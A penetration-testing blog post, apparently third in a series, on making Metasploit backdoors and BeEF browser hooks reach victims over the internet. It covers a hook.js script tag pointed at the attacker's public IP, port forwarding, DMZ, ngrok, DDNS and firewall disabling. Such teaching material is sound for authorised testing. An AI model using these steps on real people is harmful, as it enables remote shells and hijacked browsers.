---
title: Gaining Access:Part III
date: 2022-01-03 05:27:00 +0530
categories: [Penetration Testing,Access]
tags: [networking]
---
![](https://github.com/sahil-rawat/assets/blob/master/IMG/GAIN_ACCESS3.jpg?raw=true)

This is the Third Article in Gaining Access Series where we will see how we can perform the attacks we discussed in last two posts Over the internet

# 🌐 Using Attacks Outside Your Network

So far, all **client-side** and **social engineering** attacks we've explored were conducted within a **local network** meaning both the **attacker and victim were on the same LAN**.

To execute these attacks ***remotely***, across the internet, we need to configure our **network and router** to allow:
- **Incoming connections**
- **Reverse shells to reach our Kali machine**



## 🚪 Backdoor Over the Internet

To make a backdoor work outside your local network, you must:

1. **Use your Public IP Address** instead of your private/local IP.
   - You can find your public IP by searching “**What is my IP**” on Google.
2. **Create the backdoor** like before, but replace `LHOST` with your **public IP**.
3. **Start the listener** on your Kali machine using Metasploit.
4. **Enable Port Forwarding** on your router to redirect the specified port to your Kali machine's IP.

> 💡 Every router has **two IPs**:
> - **Public IP**: assigned by your ISP  
> - **Private IP**: assigned to your device in the local network


## 🕸️ BeEF Over the Internet

BeEF (Browser Exploitation Framework) can also be used remotely.

### Steps:

1. In the **BeEF terminal**, you’ll see a `<script>` tag like this:
   ```html
   <script src="http://127.0.0.1:3000/hook.js"></script>
2. Replace 127.0.0.1 with your public IP.
3. Host your webpage with this modified script tag.
4. Enable port forwarding for port 3000 on your router (BeEF’s default port).
5. When a victim visits your webpage, their browser will be hooked.

## 📶 Router Configuration

### 🔧 Method 1: Manual Port Forwarding

1. Open your browser and go to your router’s IP address (usually the default gateway like 192.168.0.1).
2. Log in with your router credentials.
3. Navigate to Port Forwarding, Virtual Server, or NAT Settings.
4. Add a new rule:
    - Port: The port used by your payload/listener (e.g., 4444, 3000)
    - Protocol: TCP (or both TCP/UDP)
    - Forward to: Your Kali machine’s private IP

That’s it, the router will now redirect incoming traffic on that port to your Kali system.

### ⚠️ Method 2: DMZ Host (Not Recommended for Long-Term Use)

Some routers allow you to set a DMZ (Demilitarized Zone) Host.

The DMZ Host will receive all unsolicited incoming traffic from the internet.

Steps:

1. Go to your router’s configuration page.
2. Find the DMZ Host section.
3. Enter your Kali machine’s private IP address.

Now, any external connection to any port will be forwarded directly to your Kali system.

>⚠️ Warning: This exposes all ports of your Kali machine to the internet only use this temporarily and with caution.

## 🧪 Testing the Setup Remotely

To confirm your setup:

1. Use a mobile phone on 4G/5G (not Wi-Fi) to act as the victim.
2. Send the payload or malicious URL to the device.
3. Monitor your Kali machine to see if the reverse shell is received.

## 🌐 Alternatives to Port Forwarding

### 1. Ngrok (Tunneling Tool)
Use Ngrok to expose a port securely:

```bash
ngrok tcp 4444
```
You’ll get a public URL like tcp://x.tcp.ngrok.io:xxxxx which you can use in your payload.

### 2. Cloudflare Tunnel
Another free tunneling tool with HTTPS support. Great for exposing web apps like BeEF or phishing pages.

## 🌍 Dynamic DNS (DDNS)

If your public IP changes frequently:

Use services like No-IP, DuckDNS, or DynDNS
These provide a domain name (e.g., attacker.ddns.net) that always points to your current IP

This ensures your payloads or scripts don’t break when your IP changes.

## 🛠 Troubleshooting Tips

> 1. Use https://canyouseeme.org/ to check if your port is open
> 2. Run nmap on your public IP to confirm visibility
> 3. Disable firewall on Kali (if testing locally)
>       - ```sudo ufw disable```

--- 

Thanks for Reading, Stay tuned for more ❤︎

If you enjoyed reading the article do follow me on:

[Twitter](https://twitter.com/sahil_s_rawat)

[LinkedIn](https://www.linkedin.com/in/sahil-singh-rawat)

[Website](https://www.sahilsinghrawat.com)

[GitHub](https://github.com/sahil-rawat)
